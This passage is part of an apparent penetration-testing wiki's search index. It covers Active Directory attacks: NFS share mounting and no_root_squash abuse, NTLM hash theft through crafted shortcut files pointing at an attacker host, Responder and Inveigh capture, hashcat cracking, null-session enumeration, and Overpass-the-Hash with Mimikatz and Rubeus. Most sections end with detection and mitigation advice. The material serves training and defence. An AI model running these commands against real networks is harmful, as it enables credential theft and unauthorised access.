</ul>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/nfs/","title":"Nfs","text":"","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#technique","title":"Technique","text":"<p>NFS (Network File System) enumeration is a reconnaissance technique used to identify shared directories on a network that are exported via the NFS protocol. Attackers use this to discover misconfigurations that could allow unauthorized access to sensitive data, or to gain a foothold for lateral movement. The primary goal is to find NFS servers, list their exported shares, and identify weak permissions that could allow read or write access.</p>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Network access to the target host(s). No authentication is typically required for the initial enumeration phase.</p> <p>System State: The target host must have the NFS service running, usually on TCP/UDP ports 2049, and the portmapper service on TCP/UDP 111.</p> <p>Information: You need the IP address or hostname of the target host or network range.</p>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#execution","title":"Execution","text":"","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#1-identifying-nfs-services","title":"1. Identifying NFS Services","text":"","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#nmap","title":"Nmap","text":"<p>The most common way to discover NFS services is to scan a network range for open ports. Nmap's default scripts can detect and enumerate NFS.</p> <p>To scan an entire subnet and identify hosts with NFS services running:</p> <pre><code>nmap -sV -p 111,2049 --script nfs-showmount &lt;target_IP_range&gt;\n</code></pre> <p>The <code>-sV</code> flag performs service and version detection, which helps confirm that the service on port 111 is indeed <code>rpcbind</code> and that NFS is running on 2049.</p>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#2-identifying-accessible-exports","title":"2. Identifying Accessible Exports","text":"","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#showmount","title":"showmount","text":"<p>Once you have identified a host running NFS, the <code>showmount</code> command is a simple and effective tool to see which directories it is exporting. The <code>-e</code> flag lists all exported file systems.</p> <pre><code>showmount -e &lt;target_IP&gt;\n</code></pre> <p>If the output shows a share is exported to <code>*</code> or <code>(everyone)</code>, it means it's accessible to any host on the network.</p>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#nmap_1","title":"Nmap","text":"<p>The <code>nfs-showmount</code> script used in the previous step also serves this purpose, providing a list of all shares that the server is exporting.</p> <pre><code>nmap -sV --script nfs-showmount &lt;target_IP&gt;\n</code></pre>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#3-connecting-and-pillage","title":"3. Connecting and Pillage","text":"<p>After identifying an open NFS share, you can attempt to mount it on your local machine to access its contents.</p> <p>Mounting the share:</p> <ol> <li>Create a local directory to act as the mount point:</li> </ol> <pre><code>mkdir /tmp/nfs_share\n</code></pre> <ol> <li>Mount the remote share to your local directory:</li> </ol> <pre><code>mount -t nfs &lt;target_IP&gt;:/&lt;exported_share_name&gt; /tmp/nfs_share\n</code></pre> <p>For example:  <code>mount -t nfs 192.168.1.100:/home/shared_docs /tmp/nfs_share</code></p> <p>Pillaging the data: Once the share is mounted, you can navigate the directory and view its contents as if it were a local folder on your machine. You can use standard commands like <code>ls</code>, <code>cd</code>, <code>cat</code>, and <code>cp</code> to explore and exfiltrate files.</p> <p>Escalating privileges with <code>no_root_squash</code>: A major vulnerability to look for is the <code>no_root_squash</code> option. If this is enabled on the server, a client with root privileges on their local machine can act as root on the NFS share. To exploit this:</p> <ol> <li>On your local machine, create a new user with the UID of 0 (root):</li> </ol> <pre><code>sudo useradd -ou 0 -g 0 newrootuser\n</code></pre> <ol> <li>Switch to the new user:</li> </ol> <pre><code>sudo su - newrootuser\n</code></pre> <ol> <li>Mount the NFS share with the new user. You will now have root-level permissions on the mounted share, allowing you to read or even modify files that a normal user could not access.</li> </ol>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#netexec","title":"NetExec","text":"<p>NetExec (nxc) can be used to enumerate NFS shares and identify vulnerabilities as part of a larger network assessment.</p> <pre><code>nxc nfs &lt;IP&gt;\n</code></pre> <p>This command will enumerate exported shares and report on any misconfigurations like <code>no_root_squash</code>.</p>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li> <p>Unmount the NFS share after you are finished to avoid a hanging filesystem.</p> </li> <li> <p><code>umount /tmp/nfs_share</code></p> </li> <li> <p>Remove the user created for exploitation.</p> </li> </ul>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#detection","title":"Detection","text":"<ul> <li>Network Traffic Analysis: Monitor for <code>mount</code> or RPC requests originating from unexpected IP addresses.</li> <li>System Logs: Look for unusual activity in system logs related to NFS mounts, especially from unauthorized hosts.</li> </ul>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/nfs/#mitigation","title":"Mitigation","text":"<ul> <li>Restrict Exports: Only export NFS shares to specific, trusted IP addresses or subnets. Avoid using <code>(everyone)</code> or <code>*</code>.</li> <li>Disable <code>no_root_squash</code>: Ensure this option is not enabled on any exported shares unless absolutely necessary and with strong access controls in place.</li> <li>Least Privilege: Apply the principle of least privilege. Configure shares to provide only the permissions (read-only, etc.) that users need.</li> <li>Firewall: Restrict access to ports 111 and 2049 at the host and network firewall levels.</li> </ul>","tags":["#stage/reconnaissance","#os/linux","#tool/nmap","#tool/mount","#tool/showmount","#tool/netexec","#technique/T1135","#tactic/TA0007","#type/technique","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/","title":"Ntlm hash theft","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#technique","title":"Technique","text":"<p>NTLM Hash Theft involves capturing NTLM authentication hashes as they're transmitted over the network. When Windows systems attempt to authenticate to resources, they often use the NTLM authentication protocol, which involves sending a hashed version of the user's password. </p> <p>An attacker can intercept these hashes through various techniques including file-based attacks, poisoning attacks, and relay attacks. While these hashes cannot be directly used to derive the plaintext password (unlike NTLM stored hashes), they can be used in Pass-the-Hash attacks or can be subjected to offline cracking attempts.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#theft-via-files","title":"Theft via Files","text":"<p>Attackers can place specially crafted files in locations where users will access them. When Windows Explorer tries to display icons or metadata for these files, it will attempt to connect to a specified server, sending NTLM authentication in the process.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#manual-creation-lnk-files","title":"Manual Creation (.lnk Files)","text":"<pre><code>$objShell = New-Object -ComObject WScript.Shell\n$lnk = $objShell.CreateShortcut(\"\\\\DC01.domain.local\\OpenShare\\IT-Driver.lnk\")\n$lnk.TargetPath = \"\\\\&lt;AttackerIP&gt;\\@ico.png\"\n$lnk.WindowStyle = 1\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n$lnk.Description = \"IT Driver\"\n$lnk.HotKey = \"Ctrl+Alt+O\"\n$lnk.Save()\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#automated-multi-type-creation-with-ntlm_theft","title":"Automated Multi-Type Creation with ntlm_theft","text":"<p>ntlm_theft can generate multiple file types that trigger NTLM authentication:</p> <pre><code>python3 ntlm_theft.py -g all -s &lt;attackerIP&gt; -f '@myfile'\n</code></pre> <p>This generates various file types including: - .lnk (Windows shortcut) - .scf (Shell Command File) - .url (Internet Shortcut) - .docx/.xlsx/.pdf (Documents with embedded links) - .xml (XML with external entity) - .htm (HTML with embedded resources)</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#capturing-hashes","title":"Capturing Hashes","text":"<p>Once the malicious files are in place, you need to capture the authentication attempts:</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#using-responder-linux","title":"Using Responder (Linux)","text":"<pre><code>sudo responder -I eth0 -wv\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#using-inveigh-windows","title":"Using Inveigh (Windows)","text":"<pre><code># PowerShell version\nImport-Module .\\Inveigh.ps1\nInvoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n\n# C# version\n.\\Inveigh.exe\n</code></pre> <p>To view captured hashes in Inveigh: <pre><code># Show unique NTLMv2 hashes\nGET NTLMV2UNIQUE\n\n# Show usernames from captured hashes\nGET NTLMV2USERNAMES\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#other-ntlm-theft-techniques","title":"Other NTLM Theft Techniques","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#network-poisoning-attacks","title":"Network Poisoning Attacks","text":"<p>These attacks involve responding to broadcast name resolution requests: - LLMNR Poisoning - NBT-NS Poisoning - IPv6 DNS Takeover</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#ntlm-relay-attacks","title":"NTLM Relay Attacks","text":"<p>Instead of just capturing hashes, relay attacks forward the authentication to access other systems.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#other-sources-of-ntlm-hashes","title":"Other Sources of NTLM Hashes","text":"<ul> <li>MS Exchange Autodiscover</li> <li>Windows file shares with automatically mounted icons</li> <li>Internet Explorer/Edge when browsing through proxy</li> <li>Outlook/Office application connections</li> <li>Windows background services (print spooler, WPAD)</li> <li>Windows Explorer preview pane</li> <li>UNC paths in various applications</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#post-capture-actions","title":"Post-Capture Actions","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#cracking-the-hashes","title":"Cracking the Hashes","text":"<p>[[hash_cracking]]</p> <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Mode 5600 is for NTLMv2 hashes (the most common in modern networks).</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#relaying-the-hashes","title":"Relaying the Hashes","text":"<p>[[relay_attacks]]</p> <p>Instead of cracking, captured authentication attempts can be relayed to other services in real-time to gain access.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#detection","title":"Detection","text":"<ul> <li>Monitor for Responder/Inveigh-like activity on the network</li> <li>Look for unusual SMB authentication attempts from unexpected sources</li> <li>Monitor for suspicious files with UNC paths placed in network shares</li> <li>Watch for multiple failed authentication attempts in quick succession</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/ntlm_hash_theft/#mitigation","title":"Mitigation","text":"<ul> <li>Disable LLMNR and NBT-NS when possible</li> <li>Enable SMB signing to prevent NTLM relay attacks</li> <li>Use the Protected Users security group for privileged accounts</li> <li>Implement strong password policies to resist offline cracking</li> <li>Restrict access to network shares</li> <li>Use AppLocker or similar technologies to prevent execution of untrusted applications</li> <li>Consider implementing Network Level Authentication (NLA)</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1557","#stage/credential-access","#os/windows","#protocol/ntlm","#tool/responder","#tool/inveigh","#tool/hashcat"]},{"location":"Active%20Directory/flat/null_session/","title":"Null session","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1021.002","#stage/reconnaissance","#protocol/smb","#os/windows","#tool/netexec","#tool/enum4linux","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/null_session/#technique","title":"Technique","text":"<p>Null session refers to an unauthenticated connection to a Windows machine or domain controller where no username or password is provided. This technique allows attackers to potentially enumerate sensitive information about the target network, including user accounts, shares, groups, and policies without authentication credentials.</p> <p>Microsoft originally designed SMB and NetBIOS services to be open and accessible for ease of use in network environments, allowing unauthenticated users to query for certain information. While modern Windows systems have significantly restricted this access by default, misconfigured or legacy systems may still permit null sessions, creating a serious security risk.</p> <p>Successful null session exploitation can provide valuable information for further attacks, including user enumeration for password spraying, service enumeration, and discovery of network resources. This represents a critical initial reconnaissance technique in the attack chain against Active Directory environments.</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1021.002","#stage/reconnaissance","#protocol/smb","#os/windows","#tool/netexec","#tool/enum4linux","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/null_session/#prerequisites","title":"Prerequisites","text":"<p>Access Level: No authentication required, only network connectivity to target systems.</p> <p>System State Requirements: - Target system with SMB services (TCP/445) or NetBIOS services (TCP/139) exposed - Misconfigured Windows security policy that allows anonymous access - Network connectivity to the target domain controllers or member servers</p> <p>Environment Setup: - Configure DNS to prioritize domain controllers</p> <pre><code>echo \"nameserver &lt;DC-IP&gt;\" &gt; /etc/resolv.conf\n</code></pre> <ul> <li>Same network segment as the target (or ability to route to SMB/LDAP services)</li> <li>Tools installed: <code>enum4linux-ng</code>, <code>smbclient</code>, <code>nxc</code> (NetExec), <code>ldapsearch</code></li> </ul> <p>Identifying Domain Controllers: <pre><code># Using DNS SRV records\nnslookup -type=SRV _ldap._tcp.domain.local\n\n# Using nltest (windows)\nnltest /dclist:yourdomain.com\n\n# Using nmap\nnmap -p 53,88,389 --open &lt;IP-RANGE&gt; -oG - | grep -i open\n</code></pre></p>","tags":["#type/technique","#tactic/TA0007","#technique/T1021.002","#stage/reconnaissance","#protocol/smb","#os/windows","#tool/netexec","#tool/enum4linux","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/null_session/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1021.002","#stage/reconnaissance","#protocol/smb","#os/windows","#tool/netexec","#tool/enum4linux","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/null_session/#testing-for-null-sessions","title":"Testing for Null Sessions","text":"<p>SMB Enumeration:</p> <pre><code># Check for null session access on a single host\nsmbclient -N -L \\\\\\\\&lt;DC-IP&gt;\n\n# Check multiple DCs from a list\nfor dc in $(cat dcs.txt); do echo $dc &amp;&amp; smbclient -N -L \\\\\\\\$dc; done\n\n# Using NetExec (formerly CrackMapExec)\nnxc smb &lt;DC-IP&gt; -u '' -p ''\n\n# Using auth.py tool\nauth smb dcs.txt\n</code></pre> <p>LDAP Enumeration:</p> <pre><code># Anonymous LDAP bind\nldapsearch -x -h &lt;DC-IP&gt; -b \"DC=domain,DC=local\" -s sub \"(objectClass=*)\" | grep -i \"cn:\"\n\n# Check if anonymous LDAP bind is possible\nnxc ldap &lt;DC-IP&gt; -u '' -p ''\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1021.002","#stage/reconnaissance","#protocol/smb","#os/windows","#tool/netexec","#tool/enum4linux","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/null_session/#exploiting-null-sessions","title":"Exploiting Null Sessions","text":"<p>User Enumeration:</p> <pre><code># Using enum4linux-ng\nenum4linux-ng -U &lt;DC-IP&gt;\n\n# Using rpcclient\nrpcclient -U \"\" -N &lt;DC-IP&gt;\nrpcclient $&gt; enumdomusers\nrpcclient $&gt; queryuser 0x3e8\n</code></pre> <p>Group Enumeration:</p> <pre><code># Using enum4linux-ng\nenum4linux-ng -G &lt;DC-IP&gt;\n\n# Using rpcclient\nrpcclient -U \"\" -N &lt;DC-IP&gt;\nrpcclient $&gt; enumdomgroups\nrpcclient $&gt; querygroup 0x200\n</code></pre> <p>Share Enumeration:</p> <pre><code># Using enum4linux-ng\nenum4linux-ng -S &lt;DC-IP&gt;\n\n# Using smbmap\nsmbmap -H &lt;DC-IP&gt; -u '' -p ''\n</code></pre> <p>Domain Policy Enumeration:</p> <pre><code># Using enum4linux-ng\nenum4linux-ng -P &lt;DC-IP&gt;\n\n# Using rpcclient\nrpcclient -U \"\" -N &lt;DC-IP&gt;\nrpcclient $&gt; getdompwinfo\n</code></pre> <p>[!NOTE] Note Anonymous login doesn't always mean useful enumeration is possible. Always attempt to extract actionable information to demonstrate impact. The most valuable targets are user lists, password policies, and accessible shares.</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1021.002","#stage/reconnaissance","#protocol/smb","#os/windows","#tool/netexec","#tool/enum4linux","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/null_session/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1021.002","#stage/reconnaissance","#protocol/smb","#os/windows","#tool/netexec","#tool/enum4linux","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/null_session/#detection","title":"Detection","text":"<ul> <li>Monitor for anonymous/null session connections to domain controllers and member servers</li> <li>Look for Event IDs related to anonymous logons:</li> <li>Windows Security Log Event ID 4624 (Type 3 logon) with blank username</li> <li>Event ID 4625 failures when null sessions are blocked</li> <li>Track SMB traffic patterns showing enumeration attempts from untrusted sources</li> <li>Implement honeypot accounts and monitor for enumeration attempts</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1021.002","#stage/reconnaissance","#protocol/smb","#os/windows","#tool/netexec","#tool/enum4linux","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/null_session/#mitigation","title":"Mitigation","text":"<p>Windows Registry Settings: <pre><code># Disable null sessions on Windows Server\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\LSA\" -Name \"RestrictAnonymous\" -Value 1\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\LSA\" -Name \"RestrictAnonymousSAM\" -Value 1\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters\" -Name \"RestrictNullSessAccess\" -Value 1\n</code></pre></p> <p>Group Policy Settings: - Configure \"Network access: Do not allow anonymous enumeration of SAM accounts\" to Enabled - Configure \"Network access: Do not allow anonymous enumeration of SAM accounts and shares\" to Enabled - Configure \"Network access: Restrict anonymous access to Named Pipes and Shares\" to Enabled - Configure \"Network access: Let Everyone permissions apply to anonymous users\" to Disabled</p> <p>Network-Level Controls: - Implement proper network segmentation - Use firewalls to restrict SMB/LDAP access to authenticated systems only - Deploy SMB signing requirements across the domain - Consider disabling SMBv1 which is more vulnerable to various attacks</p> <p>Monitoring: - Implement continuous monitoring for anonymous connection attempts - Set up alerts for successful null session authentications - Regularly audit domain controllers for proper security configurations</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1021.002","#stage/reconnaissance","#protocol/smb","#os/windows","#tool/netexec","#tool/enum4linux","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/overpass_the_hash/","title":"Overpass the hash","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#technique","title":"Technique","text":"<p>Overpass the Hash (OPtH) is a technique that allows an attacker to convert a user's NTLM or AES hash into a Kerberos ticket (TGT), effectively transitioning from NTLM authentication to Kerberos authentication. This technique is sometimes called \"Pass the Key\" because it can use AES keys rather than just NTLM hashes.</p> <p>The advantage of Overpass the Hash over standard Pass the Hash is that it: 1. Provides a fully functional Kerberos ticket, which can access any Kerberos-authenticated service 2. Bypasses restrictions that may exist on NTLM authentication 3. Allows access to services that exclusively use Kerberos 4. Creates fewer suspicious events and generally has better operational security</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#prerequisites","title":"Prerequisites","text":"<p>Access Level:  - To obtain hashes: Administrative access to the system where the user's credentials are cached - To perform the attack: Standard user access to execute the attack tools</p> <p>System State: - Target system must have valid credentials cached (NTLM hash or Kerberos encryption keys) - Network access to a domain controller for Kerberos ticket requests</p> <p>Information Needed: - Username - Domain name - User's NTLM hash or Kerberos encryption keys (AES256, AES128, or RC4)</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Overpass the Hash provides the ability to impersonate a user for any Kerberos-authenticated resource in the domain, which can lead to: - Access to file shares - Access to internal web applications - Remote management capabilities - Database access - Other domain resource access</p> <p>OPSEC</p> <ul> <li>More stealthy than traditional Pass the Hash as it generates normal Kerberos traffic</li> <li>Creates legitimate Kerberos tickets that are difficult to distinguish from regular authentication</li> <li>Less likely to trigger alerts compared to direct NTLM authentication attempts</li> <li>Still creates event logs for Kerberos TGT requests that can be monitored</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#using-mimikatz","title":"Using Mimikatz","text":"<ol> <li> <p>Extract encryption keys (administrative access required): <pre><code>mimikatz # privilege::debug\nmimikatz # sekurlsa::ekeys\n</code></pre></p> </li> <li> <p>Perform Overpass the Hash with NTLM hash: <pre><code>mimikatz # sekurlsa::pth /user:username /domain:domain.local /ntlm:e2b475c11da2a0748290d87aa966c327 /run:cmd.exe\n</code></pre></p> </li> <li> <p>Perform Overpass the Hash with AES key (more secure and stealthy): <pre><code>mimikatz # sekurlsa::pth /user:username /domain:domain.local /aes256:b9d74be0d7965c20cd0a2ea101be6eee4886cb52b9a496e8bc96313cd151d2db /run:cmd.exe\n</code></pre></p> </li> <li> <p>From the spawned command prompt, force Kerberos authentication: <pre><code>klist purge\nnet use \\\\server.domain.local\\share\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#using-rubeus","title":"Using Rubeus","text":"<ol> <li> <p>Extract encryption keys (multiple options): <pre><code># Using Rubeus (doesn't require admin for asktgt, but does for dumping keys)\nRubeus.exe dump\n\n# Or using Mimikatz as shown above\nmimikatz # sekurlsa::ekeys\n</code></pre></p> </li> <li> <p>Request a TGT with NTLM hash: <pre><code>Rubeus.exe asktgt /user:username /domain:domain.local /rc4:e2b475c11da2a0748290d87aa966c327 /ptt\n</code></pre></p> </li> <li> <p>Request a TGT with AES key: <pre><code>Rubeus.exe asktgt /user:username /domain:domain.local /aes256:b9d74be0d7965c20cd0a2ea101be6eee4886cb52b9a496e8bc96313cd151d2db /ptt\n</code></pre></p> </li> <li> <p>Verify the ticket was injected: <pre><code>klist\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#combined-approach-extract-and-use","title":"Combined Approach (Extract and Use)","text":"<ol> <li> <p>Extract credentials from the current system: <pre><code>Rubeus.exe dump /nowrap\n</code></pre></p> </li> <li> <p>Use the extracted hash/key to request a TGT: <pre><code>Rubeus.exe asktgt /user:username /domain:domain.local /rc4:e2b475c11da2a0748290d87aa966c327 /ptt\n</code></pre></p> </li> <li> <p>Access resources using the injected ticket: <pre><code># Access a file share\ndir \\\\server.domain.local\\share\n\n# Execute commands on a remote system\nPsExec.exe \\\\server.domain.local cmd.exe\n\n# Connect to a remote system with WinRM\nEnter-PSSession -ComputerName server.domain.local\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#detection","title":"Detection","text":"<ul> <li>Monitor for TGT requests from unexpected systems or for unexpected users</li> <li>Look for multiple TGT requests for different users from the same system</li> <li>Watch for unusual access patterns following TGT issuance</li> <li>Monitor for credential dumping activities that often precede Overpass the Hash</li> <li>Look for processes spawned with explicit credentials in command-line parameters</li> 